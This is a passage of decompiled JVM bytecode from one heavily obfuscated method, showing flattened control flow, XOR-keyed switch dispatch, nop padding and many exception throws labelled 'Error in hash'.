    //   4825: imul
    //   4826: ldc_w 1549883196
    //   4829: iload #168
    //   4831: ixor
    //   4832: iushr
    //   4833: iload #168
    //   4835: irem
    //   4836: iload #168
    //   4838: ldc_w 1549883176
    //   4841: iload #168
    //   4843: ixor
    //   4844: iushr
    //   4845: ixor
    //   4846: ldc_w 1587385253
    //   4849: iload #168
    //   4851: ixor
    //   4852: if_icmpeq -> 4879
    //   4855: aconst_null
    //   4856: athrow
    //   4857: nop
    //   4858: nop
    //   4859: nop
    //   4860: nop
    //   4861: nop
    //   4862: nop
    //   4863: nop
    //   4864: nop
    //   4865: nop
    //   4866: nop
    //   4867: nop
    //   4868: nop
    //   4869: nop
    //   4870: nop
    //   4871: nop
    //   4872: nop
    //   4873: nop
    //   4874: nop
    //   4875: nop
    //   4876: nop
    //   4877: nop
    //   4878: athrow
    //   4879: new java/lang/IllegalAccessException
    //   4882: dup
    //   4883: invokespecial <init> : ()V
    //   4886: athrow
    //   4887: nop
    //   4888: nop
    //   4889: nop
    //   4890: nop
    //   4891: nop
    //   4892: nop
    //   4893: nop
    //   4894: nop
    //   4895: nop
    //   4896: nop
    //   4897: nop
    //   4898: nop
    //   4899: nop
    //   4900: nop
    //   4901: nop
    //   4902: nop
    //   4903: nop
    //   4904: nop
    //   4905: nop
    //   4906: nop
    //   4907: nop
    //   4908: athrow
    //   4909: iload #168
    //   4911: bipush #7
    //   4913: bipush #29
    //   4915: ishl
    //   4916: iand
    //   4917: bipush #29
    //   4919: ishr
    //   4920: iload #168
    //   4922: iconst_3
    //   4923: ishl
    //   4924: ior
    //   4925: lookupswitch default -> 6593, -1359781325 -> 4963, -485836350 -> 4952
    //   4952: ldc_w 1034304593
    //   4955: iload #168
    //   4957: ixor
    //   4958: istore #168
    //   4960: goto -> 4971
    //   4963: ldc_w 337184559
    //   4966: iload #168
    //   4968: ixor
    //   4969: istore #168
    //   4971: pop
    //   4972: iload #168
    //   4974: bipush #31
    //   4976: imul
    //   4977: iconst_4
    //   4978: iushr
    //   4979: iload #168
    //   4981: irem
    //   4982: iload #168
    //   4984: bipush #16
    //   4986: iushr
    //   4987: ixor
    //   4988: ldc_w 225575388
    //   4991: if_icmpne -> 6605
    //   4994: ldc_w 889703404
    //   4997: iload #168
    //   4999: ixor
    //   5000: istore #168
    //   5002: goto -> 5024
    //   5005: ldc_w 1524582481
    //   5008: iload #168
    //   5010: ixor
    //   5011: istore #168
    //   5013: goto -> 5024
    //   5016: ldc_w 815235258
    //   5019: iload #168
    //   5021: ixor
    //   5022: istore #168
    //   5024: iload #168
    //   5026: bipush #31
    //   5028: imul
    //   5029: iconst_4
    //   5030: iushr
    //   5031: iload #168
    //   5033: irem
    //   5034: iload #168
    //   5036: bipush #16
    //   5038: iushr
    //   5039: ixor
    //   5040: ldc_w 70607809
    //   5043: if_icmpne -> 7011
    //   5046: ldc_w 1941506974
    //   5049: iload #168
    //   5051: ixor
    //   5052: istore #168
    //   5054: iload #168
    //   5056: ldc_w 662285060
    //   5059: iload #168
    //   5061: ixor
    //   5062: imul
    //   5063: ldc_w 662285087
    //   5066: iload #168
    //   5068: ixor
    //   5069: iushr
    //   5070: iload #168
    //   5072: irem
    //   5073: iload #168
    //   5075: ldc_w 662285067
    //   5078: iload #168
    //   5080: ixor
    //   5081: iushr
    //   5082: ixor
    //   5083: ldc_w 721565670
    //   5086: iload #168
    //   5088: ixor
    //   5089: if_icmpeq -> 5116
    //   5092: aconst_null
    //   5093: athrow
    //   5094: nop
    //   5095: nop
    //   5096: nop
    //   5097: nop
    //   5098: nop
    //   5099: nop
    //   5100: nop
    //   5101: nop
    //   5102: nop
    //   5103: nop
    //   5104: nop
    //   5105: nop
    //   5106: nop
    //   5107: nop
    //   5108: nop
    //   5109: nop
    //   5110: nop
    //   5111: nop
    //   5112: nop
    //   5113: nop
    //   5114: nop
    //   5115: athrow
    //   5116: new java/lang/RuntimeException
    //   5119: dup
    //   5120: invokespecial <init> : ()V
    //   5123: athrow
    //   5124: nop
    //   5125: nop
    //   5126: nop
    //   5127: nop
    //   5128: nop
    //   5129: nop
    //   5130: nop
    //   5131: nop
    //   5132: nop
    //   5133: nop
    //   5134: nop
    //   5135: nop
    //   5136: nop
    //   5137: nop
    //   5138: nop
    //   5139: nop
    //   5140: nop
    //   5141: nop
    //   5142: nop
    //   5143: nop
    //   5144: nop
    //   5145: athrow
    //   5146: iload #168
    //   5148: bipush #7
    //   5150: bipush #29
    //   5152: ishl
    //   5153: iand
    //   5154: bipush #29
    //   5156: ishr
    //   5157: iload #168
    //   5159: iconst_3
    //   5160: ishl
    //   5161: ior
    //   5162: lookupswitch default -> 6917, -1782480365 -> 5188, 1003313369 -> 5199
    //   5188: ldc_w 2083562367
    //   5191: iload #168
    //   5193: ixor
    //   5194: istore #168
    //   5196: goto -> 5207
    //   5199: ldc_w 703674406
    //   5202: iload #168
    //   5204: ixor
    //   5205: istore #168
    //   5207: pop
    //   5208: iload #168
    //   5210: bipush #31
    //   5212: imul
    //   5213: iconst_4
    //   5214: iushr
    //   5215: iload #168
    //   5217: irem
    //   5218: iload #168
    //   5220: bipush #16
    //   5222: iushr
    //   5223: ixor
    //   5224: ldc_w 203985870
    //   5227: if_icmpne -> 6929
    //   5230: ldc_w 1694564196
    //   5233: iload #168
    //   5235: ixor
    //   5236: istore #168
    //   5238: iload #19
    //   5240: ldc_w 1804102744
    //   5243: iload #168
    //   5245: ixor
    //   5246: iadd
    //   5247: istore #19
    //   5249: iload #168
    //   5251: bipush #31
    //   5253: imul
    //   5254: iconst_4
    //   5255: iushr
    //   5256: iload #168
    //   5258: irem
    //   5259: iload #168
    //   5261: bipush #16
    //   5263: iushr
    //   5264: ixor
    //   5265: ldc_w 5782116
    //   5268: if_icmpne -> 6939
    //   5271: ldc_w 1947233481
    //   5274: iload #168
    //   5276: ixor
    //   5277: istore #168
    //   5279: iload #168
    //   5281: ldc_w 530055311
    //   5284: iload #168
    //   5286: ixor
    //   5287: imul
    //   5288: ldc_w 530055316
    //   5291: iload #168
    //   5293: ixor
    //   5294: iushr
    //   5295: iload #168
    //   5297: irem
    //   5298: iload #168
    //   5300: ldc_w 530055296
    //   5303: iload #168
    //   5305: ixor
    //   5306: iushr
    //   5307: ixor
    //   5308: ldc_w 313433631
    //   5311: iload #168
    //   5313: ixor
    //   5314: if_icmpeq -> 5341
    //   5317: aconst_null
    //   5318: athrow
    //   5319: nop
    //   5320: nop
    //   5321: nop
    //   5322: nop
    //   5323: nop
    //   5324: nop
    //   5325: nop
    //   5326: nop
    //   5327: nop
    //   5328: nop
    //   5329: nop
    //   5330: nop
    //   5331: nop
    //   5332: nop
    //   5333: nop
    //   5334: nop
    //   5335: nop
    //   5336: nop
    //   5337: nop
    //   5338: nop
    //   5339: nop
    //   5340: athrow
    //   5341: new java/io/IOException
    //   5344: dup
    //   5345: invokespecial <init> : ()V
    //   5348: athrow
    //   5349: nop
    //   5350: nop
    //   5351: nop
    //   5352: nop
    //   5353: nop
    //   5354: nop
    //   5355: nop
    //   5356: nop
    //   5357: nop
    //   5358: nop
    //   5359: nop
    //   5360: nop
    //   5361: nop
    //   5362: nop
    //   5363: nop
    //   5364: nop
    //   5365: nop
    //   5366: nop
    //   5367: nop
    //   5368: nop
    //   5369: nop
    //   5370: athrow
    //   5371: iload #168
    //   5373: bipush #7
    //   5375: bipush #29
    //   5377: ishl
    //   5378: iand
    //   5379: bipush #29
    //   5381: ishr
    //   5382: iload #168
    //   5384: iconst_3
    //   5385: ishl
    //   5386: ior
    //   5387: lookupswitch default -> 6959, -539414246 -> 5412, -54524800 -> 5423
    //   5412: ldc_w 1543958563
    //   5415: iload #168
    //   5417: ixor
    //   5418: istore #168
    //   5420: goto -> 5431
    //   5423: ldc_w 409327248
    //   5426: iload #168
    //   5428: ixor
    //   5429: istore #168
    //   5431: pop
    //   5432: iload #168
    //   5434: bipush #31
    //   5436: imul
    //   5437: iconst_4
    //   5438: iushr
    //   5439: iload #168
    //   5441: irem
    //   5442: iload #168
    //   5444: bipush #16
    //   5446: iushr
    //   5447: ixor
    //   5448: ldc_w 125697885
    //   5451: if_icmpne -> 6971
    //   5454: ldc_w 1870154748
    //   5457: iload #168
    //   5459: ixor
    //   5460: istore #168
    //   5462: goto -> 1430
    //   5465: ldc_w 1961473052
    //   5468: iload #168
    //   5470: ixor
    //   5471: istore #168
    //   5473: iload #168
    //   5475: bipush #31
    //   5477: imul
    //   5478: iconst_4
    //   5479: iushr
    //   5480: iload #168
    //   5482: irem
    //   5483: iload #168
    //   5485: bipush #16
    //   5487: iushr
    //   5488: ixor
    //   5489: ldc_w 118590798
    //   5492: if_icmpne -> 7071
    //   5495: ldc_w 46578318
    //   5498: iload #168
    //   5500: ixor
    //   5501: istore #168
    //   5503: iload #168
    //   5505: ldc_w 514495345
    //   5508: iload #168
    //   5510: ixor
    //   5511: imul
    //   5512: ldc_w 514495338
    //   5515: iload #168
    //   5517: ixor
    //   5518: iushr
    //   5519: iload #168
    //   5521: irem
    //   5522: iload #168
    //   5524: ldc_w 514495358
    //   5527: iload #168
    //   5529: ixor
    //   5530: iushr
    //   5531: ixor
    //   5532: ldc_w 364965985
    //   5535: iload #168
    //   5537: ixor
    //   5538: if_icmpeq -> 5565
    //   5541: aconst_null
    //   5542: athrow
    //   5543: nop
    //   5544: nop
    //   5545: nop
    //   5546: nop
    //   5547: nop
    //   5548: nop
    //   5549: nop
    //   5550: nop
    //   5551: nop
    //   5552: nop
    //   5553: nop
    //   5554: nop
    //   5555: nop
    //   5556: nop
    //   5557: nop
    //   5558: nop
    //   5559: nop
    //   5560: nop
    //   5561: nop
    //   5562: nop
    //   5563: nop
    //   5564: athrow
    //   5565: new java/lang/IllegalAccessException
    //   5568: dup
    //   5569: invokespecial <init> : ()V
    //   5572: athrow
    //   5573: nop
    //   5574: nop
    //   5575: nop
    //   5576: nop
    //   5577: nop
    //   5578: nop
    //   5579: nop
    //   5580: nop
    //   5581: nop
    //   5582: nop
    //   5583: nop
    //   5584: nop
    //   5585: nop
    //   5586: nop
    //   5587: nop
    //   5588: nop
    //   5589: nop
    //   5590: nop
    //   5591: nop
    //   5592: nop
    //   5593: nop
    //   5594: athrow
    //   5595: iload #168
    //   5597: bipush #7
    //   5599: bipush #29
    //   5601: ishl
    //   5602: iand
    //   5603: bipush #29
    //   5605: ishr
    //   5606: iload #168
    //   5608: iconst_3
    //   5609: ishl
    //   5610: ior
    //   5611: lookupswitch default -> 7101, -1066420989 -> 5636, -179004560 -> 5647
    //   5636: ldc_w 777117765
    //   5639: iload #168
    //   5641: ixor
    //   5642: istore #168
    //   5644: goto -> 5655
    //   5647: ldc_w 1224115595
    //   5650: iload #168
    //   5652: ixor
    //   5653: istore #168
    //   5655: pop
    //   5656: iload #168
    //   5658: bipush #31
    //   5660: imul
    //   5661: iconst_4
    //   5662: iushr
    //   5663: iload #168
    //   5665: irem
    //   5666: iload #168
    //   5668: bipush #16
    //   5670: iushr
    //   5671: ixor
    //   5672: ldc_w 122829319
    //   5675: if_icmpne -> 7113
    //   5678: ldc_w 162234232
    //   5681: iload #168
    //   5683: ixor
    //   5684: istore #168
    //   5686: goto -> 889
    //   5689: iload #168
    //   5691: ldc_w 800758542
    //   5694: iload #168
    //   5696: ixor
    //   5697: imul
    //   5698: ldc_w 800758549
    //   5701: iload #168
    //   5703: ixor
    //   5704: iushr
    //   5705: iload #168
    //   5707: irem
    //   5708: iload #168
    //   5710: ldc_w 800758529
    //   5713: iload #168
    //   5715: ixor
    //   5716: iushr
    //   5717: ixor
    //   5718: ldc_w 599996635
    //   5721: iload #168
    //   5723: ixor
    //   5724: if_icmpeq -> 5751
    //   5727: aconst_null
    //   5728: athrow
    //   5729: nop
    //   5730: nop
    //   5731: nop
    //   5732: nop
    //   5733: nop
    //   5734: nop
    //   5735: nop
    //   5736: nop
    //   5737: nop
    //   5738: nop
    //   5739: nop
    //   5740: nop
    //   5741: nop
    //   5742: nop
    //   5743: nop
    //   5744: nop
    //   5745: nop
    //   5746: nop
    //   5747: nop
    //   5748: nop
    //   5749: nop
    //   5750: athrow
    //   5751: new java/io/IOException
    //   5754: dup
    //   5755: invokespecial <init> : ()V
    //   5758: athrow
    //   5759: nop
    //   5760: nop
    //   5761: nop
    //   5762: nop
    //   5763: nop
    //   5764: nop
    //   5765: nop
    //   5766: nop
    //   5767: nop
    //   5768: nop
    //   5769: nop
    //   5770: nop
    //   5771: nop
    //   5772: nop
    //   5773: nop
    //   5774: nop
    //   5775: nop
    //   5776: nop
    //   5777: nop
    //   5778: nop
    //   5779: nop
    //   5780: athrow
    //   5781: iload #168
    //   5783: bipush #7
    //   5785: bipush #29
    //   5787: ishl
    //   5788: iand
    //   5789: bipush #29
    //   5791: ishr
    //   5792: iload #168
    //   5794: iconst_3
    //   5795: ishl
    //   5796: ior
    //   5797: lookupswitch default -> 7143, 1696727705 -> 5824, 2111101065 -> 5835
    //   5824: ldc_w 1151355089
    //   5827: iload #168
    //   5829: ixor
    //   5830: istore #168
    //   5832: goto -> 5843
    //   5835: ldc_w 1203671955
    //   5838: iload #168
    //   5840: ixor
    //   5841: istore #168
    //   5843: pop
    //   5844: iload #168
    //   5846: bipush #31
    //   5848: imul
    //   5849: iconst_4
    //   5850: iushr
    //   5851: iload #168
    //   5853: irem
    //   5854: iload #168
    //   5856: bipush #16
    //   5858: iushr
    //   5859: ixor
    //   5860: ldc_w 159889535
    //   5863: if_icmpne -> 7155
    //   5866: ldc_w 301275309
    //   5869: iload #168
    //   5871: ixor
    //   5872: istore #168
    //   5874: iload #168
    //   5876: bipush #31
    //   5878: imul
    //   5879: iconst_4
    //   5880: iushr
    //   5881: iload #168
    //   5883: irem
    //   5884: iload #168
    //   5886: bipush #16
    //   5888: iushr
    //   5889: ixor
    //   5890: ldc_w 205747882
    //   5893: if_icmpne -> 7165
    //   5896: ldc_w 1090189055
    //   5899: iload #168
    //   5901: ixor
    //   5902: istore #168
    //   5904: iload #168
    //   5906: ldc_w 957081295
    //   5909: iload #168
    //   5911: ixor
    //   5912: imul
    //   5913: ldc_w 957081300
    //   5916: iload #168
    //   5918: ixor
    //   5919: iushr
    //   5920: iload #168
    //   5922: irem
    //   5923: iload #168
    //   5925: ldc_w 957081280
    //   5928: iload #168
    //   5930: ixor
    //   5931: iushr
    //   5932: ixor
    //   5933: ldc_w 931975400
    //   5936: iload #168
    //   5938: ixor
    //   5939: if_icmpeq -> 5966
    //   5942: aconst_null
    //   5943: athrow
    //   5944: nop
    //   5945: nop
    //   5946: nop
    //   5947: nop
    //   5948: nop
    //   5949: nop
    //   5950: nop
    //   5951: nop
    //   5952: nop
    //   5953: nop
    //   5954: nop
    //   5955: nop
    //   5956: nop
    //   5957: nop
    //   5958: nop
    //   5959: nop
    //   5960: nop
    //   5961: nop
    //   5962: nop
    //   5963: nop
    //   5964: nop
    //   5965: athrow
    //   5966: new java/lang/IllegalAccessException
    //   5969: dup
    //   5970: invokespecial <init> : ()V
    //   5973: athrow
    //   5974: nop
    //   5975: nop
    //   5976: nop
    //   5977: nop
    //   5978: nop
    //   5979: nop
    //   5980: nop
    //   5981: nop
    //   5982: nop
    //   5983: nop
    //   5984: nop
    //   5985: nop
    //   5986: nop
    //   5987: nop
    //   5988: nop
    //   5989: nop
    //   5990: nop
    //   5991: nop
    //   5992: nop
    //   5993: nop
    //   5994: nop
    //   5995: athrow
    //   5996: iload #168
    //   5998: bipush #7
    //   6000: bipush #29
    //   6002: ishl
    //   6003: iand
    //   6004: bipush #29
    //   6006: ishr
    //   6007: iload #168
    //   6009: iconst_3
    //   6010: ishl
    //   6011: ior
    //   6012: lookupswitch default -> 7195, -933284223 -> 6040, -614230485 -> 6051
    //   6040: ldc_w 582290017
    //   6043: iload #168
    //   6045: ixor
    //   6046: istore #168
    //   6048: goto -> 6059
    //   6051: ldc_w 1624415860
    //   6054: iload #168
    //   6056: ixor
    //   6057: istore #168
    //   6059: pop
    //   6060: iload #168
    //   6062: bipush #31
    //   6064: imul
    //   6065: iconst_4
    //   6066: iushr
    //   6067: iload #168
    //   6069: irem
    //   6070: iload #168
    //   6072: bipush #16
    //   6074: iushr
    //   6075: ixor
    //   6076: ldc_w 96596264
    //   6079: if_icmpne -> 7207
    //   6082: ldc_w 1145668908
    //   6085: iload #168
    //   6087: ixor
    //   6088: istore #168
    //   6090: goto -> 889
    //   6093: new java/lang/RuntimeException
    //   6096: astore_3
    //   6097: aload_3
    //   6098: invokespecial <init> : ()V
    //   6101: aload_3
    //   6102: athrow
    //   6103: nop
    //   6104: nop
    //   6105: nop
    //   6106: athrow
    //   6107: nop
    //   6108: nop
    //   6109: nop
    //   6110: nop
    //   6111: nop
    //   6112: athrow
    //   6113: nop
    //   6114: nop
    //   6115: nop
    //   6116: athrow
    //   6117: nop
    //   6118: nop
    //   6119: nop
    //   6120: nop
    //   6121: nop
    //   6122: athrow
    //   6123: new java/lang/IllegalAccessException
    //   6126: astore_3
    //   6127: aload_3
    //   6128: ldc 'Error in hash'
    //   6130: invokespecial <init> : (Ljava/lang/String;)V
    //   6133: aload_3
    //   6134: athrow
    //   6135: new java/lang/IllegalAccessException
    //   6138: astore_3
    //   6139: aload_3
    //   6140: invokespecial <init> : ()V
    //   6143: aload_3
    //   6144: athrow
    //   6145: new java/lang/IllegalAccessException
    //   6148: astore_3
    //   6149: aload_3
    //   6150: invokespecial <init> : ()V
    //   6153: aload_3
    //   6154: athrow
    //   6155: nop
    //   6156: nop
    //   6157: nop
    //   6158: athrow
    //   6159: nop
    //   6160: nop
    //   6161: nop
    //   6162: nop
    //   6163: nop
    //   6164: athrow
    //   6165: nop
    //   6166: nop
    //   6167: nop
    //   6168: athrow
    //   6169: nop
    //   6170: nop
    //   6171: nop
    //   6172: nop
    //   6173: nop
    //   6174: athrow
    //   6175: new java/lang/RuntimeException
    //   6178: astore_3
    //   6179: aload_3
    //   6180: ldc 'Error in hash'
    //   6182: invokespecial <init> : (Ljava/lang/String;)V
    //   6185: aload_3
    //   6186: athrow
    //   6187: new java/io/IOException
    //   6190: astore_3
    //   6191: aload_3
    //   6192: invokespecial <init> : ()V
    //   6195: aload_3
    //   6196: athrow
    //   6197: new java/lang/RuntimeException
    //   6200: astore_3
    //   6201: aload_3
    //   6202: ldc 'Error in hash'
    //   6204: invokespecial <init> : (Ljava/lang/String;)V
    //   6207: aload_3
    //   6208: athrow
    //   6209: new java/lang/IllegalAccessException
    //   6212: astore_3
    //   6213: aload_3
    //   6214: invokespecial <init> : ()V
    //   6217: aload_3
    //   6218: athrow
    //   6219: nop
    //   6220: nop
    //   6221: nop
    //   6222: athrow
    //   6223: nop
    //   6224: nop
    //   6225: nop
    //   6226: nop
    //   6227: nop
    //   6228: athrow
    //   6229: new java/io/IOException
    //   6232: astore_3
    //   6233: aload_3
    //   6234: invokespecial <init> : ()V
    //   6237: aload_3
    //   6238: athrow
    //   6239: new java/lang/IllegalAccessException
    //   6242: astore_3
    //   6243: aload_3
    //   6244: ldc 'Error in hash'
    //   6246: invokespecial <init> : (Ljava/lang/String;)V
    //   6249: aload_3
    //   6250: athrow
    //   6251: nop
    //   6252: nop
    //   6253: nop
    //   6254: athrow
    //   6255: nop
    //   6256: nop
    //   6257: nop
    //   6258: nop
    //   6259: nop
    //   6260: athrow
    //   6261: nop
    //   6262: nop
    //   6263: nop
    //   6264: athrow
    //   6265: nop
    //   6266: nop
    //   6267: nop
    //   6268: nop
    //   6269: nop
    //   6270: athrow
    //   6271: new java/lang/RuntimeException
    //   6274: astore_3
    //   6275: aload_3
    //   6276: ldc 'Error in hash'
    //   6278: invokespecial <init> : (Ljava/lang/String;)V
    //   6281: aload_3
    //   6282: athrow
    //   6283: new java/lang/IllegalAccessException
    //   6286: astore_3
    //   6287: aload_3
    //   6288: invokespecial <init> : ()V
    //   6291: aload_3
    //   6292: athrow
    //   6293: nop
    //   6294: nop
    //   6295: nop
    //   6296: athrow
    //   6297: nop
    //   6298: nop
    //   6299: nop
    //   6300: nop
    //   6301: nop
    //   6302: athrow
    //   6303: new java/lang/IllegalAccessException
    //   6306: astore_3
    //   6307: aload_3
    //   6308: invokespecial <init> : ()V
    //   6311: aload_3
    //   6312: athrow
    //   6313: nop
    //   6314: nop
    //   6315: nop
    //   6316: athrow
    //   6317: nop
    //   6318: nop
    //   6319: nop
    //   6320: nop
    //   6321: nop
    //   6322: athrow
    //   6323: nop
    //   6324: nop
    //   6325: nop
    //   6326: athrow
    //   6327: nop
    //   6328: nop
    //   6329: nop
    //   6330: nop
    //   6331: nop
    //   6332: athrow
    //   6333: new java/lang/IllegalAccessException
    //   6336: astore_3
    //   6337: aload_3
    //   6338: ldc 'Error in hash'
    //   6340: invokespecial <init> : (Ljava/lang/String;)V
    //   6343: aload_3
    //   6344: athrow
    //   6345: new java/lang/RuntimeException
    //   6348: astore_3
    //   6349: aload_3
    //   6350: invokespecial <init> : ()V
    //   6353: aload_3
    //   6354: athrow
    //   6355: new java/lang/RuntimeException
    //   6358: astore_3
    //   6359: aload_3
    //   6360: invokespecial <init> : ()V
    //   6363: aload_3
    //   6364: athrow
    //   6365: new java/lang/RuntimeException
    //   6368: astore_3
    //   6369: aload_3
    //   6370: invokespecial <init> : ()V
    //   6373: aload_3
    //   6374: athrow
    //   6375: new java/lang/IllegalAccessException
    //   6378: astore_3
    //   6379: aload_3
    //   6380: invokespecial <init> : ()V
    //   6383: aload_3
    //   6384: athrow
    //   6385: nop
    //   6386: nop
    //   6387: nop
    //   6388: athrow
    //   6389: nop
    //   6390: nop
    //   6391: nop
    //   6392: nop
    //   6393: nop
    //   6394: athrow
    //   6395: nop
    //   6396: nop
    //   6397: nop
    //   6398: athrow
    //   6399: nop
    //   6400: nop
    //   6401: nop
    //   6402: nop
    //   6403: nop
    //   6404: athrow
    //   6405: new java/lang/IllegalAccessException
    //   6408: astore_3
    //   6409: aload_3
    //   6410: ldc 'Error in hash'
    //   6412: invokespecial <init> : (Ljava/lang/String;)V
    //   6415: aload_3
    //   6416: athrow
    //   6417: new java/lang/RuntimeException
    //   6420: astore_3
    //   6421: aload_3
    //   6422: invokespecial <init> : ()V
    //   6425: aload_3
    //   6426: athrow
    //   6427: new java/lang/RuntimeException
    //   6430: astore_3
    //   6431: aload_3
    //   6432: ldc 'Error in hash'
    //   6434: invokespecial <init> : (Ljava/lang/String;)V
    //   6437: aload_3
    //   6438: athrow
    //   6439: new java/io/IOException
    //   6442: astore_3
    //   6443: aload_3
    //   6444: invokespecial <init> : ()V
    //   6447: aload_3
    //   6448: athrow
    //   6449: nop
    //   6450: nop
    //   6451: nop
    //   6452: athrow
    //   6453: nop
    //   6454: nop
    //   6455: nop
    //   6456: nop
    //   6457: nop
    //   6458: athrow
    //   6459: nop
    //   6460: nop
    //   6461: nop
    //   6462: athrow
    //   6463: nop
    //   6464: nop
    //   6465: nop
    //   6466: nop
    //   6467: nop
    //   6468: athrow
    //   6469: new java/io/IOException
    //   6472: astore_3
    //   6473: aload_3
    //   6474: invokespecial <init> : ()V
    //   6477: aload_3
    //   6478: athrow
    //   6479: new java/io/IOException
    //   6482: astore_3
    //   6483: aload_3
    //   6484: invokespecial <init> : ()V
    //   6487: aload_3
    //   6488: athrow
    //   6489: new java/lang/RuntimeException
    //   6492: astore_3
    //   6493: aload_3
    //   6494: ldc 'Error in hash'
    //   6496: invokespecial <init> : (Ljava/lang/String;)V
    //   6499: aload_3
    //   6500: athrow
    //   6501: new java/lang/RuntimeException
    //   6504: astore_3
    //   6505: aload_3
    //   6506: invokespecial <init> : ()V
    //   6509: aload_3
    //   6510: athrow
    //   6511: nop
    //   6512: nop
    //   6513: nop
    //   6514: athrow
    //   6515: nop
    //   6516: nop
    //   6517: nop
    //   6518: nop
    //   6519: nop
    //   6520: athrow
    //   6521: nop
    //   6522: nop
    //   6523: nop
    //   6524: athrow
    //   6525: nop
    //   6526: nop
    //   6527: nop
    //   6528: nop
    //   6529: nop
    //   6530: athrow
    //   6531: nop
    //   6532: nop
    //   6533: nop
    //   6534: athrow
    //   6535: nop
    //   6536: nop
    //   6537: nop
    //   6538: nop
    //   6539: nop
    //   6540: athrow
    //   6541: new java/lang/RuntimeException
    //   6544: astore_3
    //   6545: aload_3
    //   6546: ldc 'Error in hash'
    //   6548: invokespecial <init> : (Ljava/lang/String;)V
    //   6551: aload_3
    //   6552: athrow
    //   6553: new java/lang/IllegalAccessException
    //   6556: astore_3
    //   6557: aload_3
    //   6558: invokespecial <init> : ()V
    //   6561: aload_3
    //   6562: athrow
    //   6563: nop
    //   6564: nop
    //   6565: nop
    //   6566: athrow
    //   6567: nop
    //   6568: nop
    //   6569: nop
    //   6570: nop
    //   6571: nop
    //   6572: athrow
    //   6573: nop
    //   6574: nop
    //   6575: nop
    //   6576: athrow
    //   6577: nop
    //   6578: nop
    //   6579: nop
    //   6580: nop
    //   6581: nop
    //   6582: athrow
    //   6583: nop
    //   6584: nop
    //   6585: nop
    //   6586: athrow
    //   6587: nop
    //   6588: nop
    //   6589: nop
    //   6590: nop
    //   6591: nop
    //   6592: athrow
    //   6593: new java/io/IOException
    //   6596: astore_3
    //   6597: aload_3
    //   6598: ldc 'Error in hash'
    //   6600: invokespecial <init> : (Ljava/lang/String;)V
    //   6603: aload_3
    //   6604: athrow
    //   6605: new java/lang/IllegalAccessException
    //   6608: astore_3
    //   6609: aload_3
    //   6610: invokespecial <init> : ()V
    //   6613: aload_3
    //   6614: athrow
    //   6615: iload #168
    //   6617: bipush #7
    //   6619: bipush #29
    //   6621: ishl
    //   6622: iand
    //   6623: bipush #29
    //   6625: ishr
    //   6626: iload #168
    //   6628: iconst_3
    //   6629: ishl
    //   6630: ior
    //   6631: lookupswitch default -> 6734, -2023188447 -> 6768, -1644533110 -> 6812, -1165981159 -> 6723, -555965456 -> 6746, 582550011 -> 6757, 874736832 -> 6712, 1056108624 -> 6779, 1295146258 -> 6801, 1895777952 -> 6790
    //   6712: ldc_w 1704296195
    //   6715: iload #168
    //   6717: ixor
    //   6718: istore #168
    //   6720: goto -> 6820
    //   6723: ldc_w 1413546968
    //   6726: iload #168
    //   6728: ixor
    //   6729: istore #168
    //   6731: goto -> 6820
    //   6734: new java/io/IOException
    //   6737: astore_3
    //   6738: aload_3
    //   6739: ldc 'Error in hash'
    //   6741: invokespecial <init> : (Ljava/lang/String;)V
    //   6744: aload_3
    //   6745: athrow
    //   6746: ldc_w 2026538725
    //   6749: iload #168
    //   6751: ixor
    //   6752: istore #168
    //   6754: goto -> 6820
    //   6757: ldc_w 122040996
    //   6760: iload #168
    //   6762: ixor
    //   6763: istore #168
    //   6765: goto -> 6820
    //   6768: ldc_w 1409024415
    //   6771: iload #168
    //   6773: ixor
    //   6774: istore #168
    //   6776: goto -> 6820
    //   6779: ldc_w 1691307153
    //   6782: iload #168
    //   6784: ixor
    //   6785: istore #168
    //   6787: goto -> 6820
    //   6790: ldc_w 1829698127
    //   6793: iload #168
    //   6795: ixor
    //   6796: istore #168
    //   6798: goto -> 6820
    //   6801: ldc_w 716659001
    //   6804: iload #168
    //   6806: ixor
    //   6807: istore #168
    //   6809: goto -> 6820
    //   6812: ldc_w 816734154
    //   6815: iload #168
    //   6817: ixor
    //   6818: istore #168
    //   6820: astore #76
    //   6822: aload #76
    //   6824: invokevirtual printStackTrace : ()V
    //   6827: aconst_null
    //   6828: astore #77
    //   6830: aload #77
    //   6832: areturn
    //   6833: nop
    //   6834: nop
    //   6835: nop
    //   6836: nop
    //   6837: nop
    //   6838: nop
    //   6839: nop
    //   6840: nop
    //   6841: nop
    //   6842: nop
    //   6843: nop
    //   6844: nop
    //   6845: nop
    //   6846: nop
    //   6847: nop
    //   6848: nop
    //   6849: nop
    //   6850: nop
    //   6851: nop
    //   6852: nop
    //   6853: nop
    //   6854: athrow
    //   6855: nop
    //   6856: nop
    //   6857: nop
    //   6858: athrow
    //   6859: nop
    //   6860: nop
    //   6861: nop
    //   6862: nop
    //   6863: nop
    //   6864: athrow
    //   6865: new java/lang/RuntimeException
    //   6868: astore_3
    //   6869: aload_3
    //   6870: invokespecial <init> : ()V
    //   6873: aload_3
    //   6874: athrow
    //   6875: new java/lang/RuntimeException
    //   6878: astore_3
    //   6879: aload_3
    //   6880: ldc 'Error in hash'
    //   6882: invokespecial <init> : (Ljava/lang/String;)V
    //   6885: aload_3
    //   6886: athrow
    //   6887: new java/lang/RuntimeException
    //   6890: astore_3
    //   6891: aload_3
    //   6892: invokespecial <init> : ()V
    //   6895: aload_3
    //   6896: athrow
    //   6897: nop
    //   6898: nop
    //   6899: nop
    //   6900: athrow
    //   6901: nop
    //   6902: nop
    //   6903: nop
    //   6904: nop
    //   6905: nop
    //   6906: athrow
    //   6907: nop
    //   6908: nop
    //   6909: nop
    //   6910: athrow
    //   6911: nop
    //   6912: nop
    //   6913: nop
    //   6914: nop
    //   6915: nop
    //   6916: athrow
    //   6917: new java/lang/IllegalAccessException
    //   6920: astore_3
    //   6921: aload_3
    //   6922: ldc 'Error in hash'
    //   6924: invokespecial <init> : (Ljava/lang/String;)V
    //   6927: aload_3
    //   6928: athrow
    //   6929: new java/lang/IllegalAccessException
    //   6932: astore_3
    //   6933: aload_3
    //   6934: invokespecial <init> : ()V
    //   6937: aload_3
    //   6938: athrow
    //   6939: new java/io/IOException
    //   6942: astore_3
    //   6943: aload_3
    //   6944: invokespecial <init> : ()V
    //   6947: aload_3
    //   6948: athrow
    //   6949: nop
    //   6950: nop
    //   6951: nop
    //   6952: athrow
    //   6953: nop
    //   6954: nop
    //   6955: nop
    //   6956: nop
    //   6957: nop
    //   6958: athrow
    //   6959: new java/io/IOException
    //   6962: astore_3
    //   6963: aload_3
    //   6964: ldc 'Error in hash'
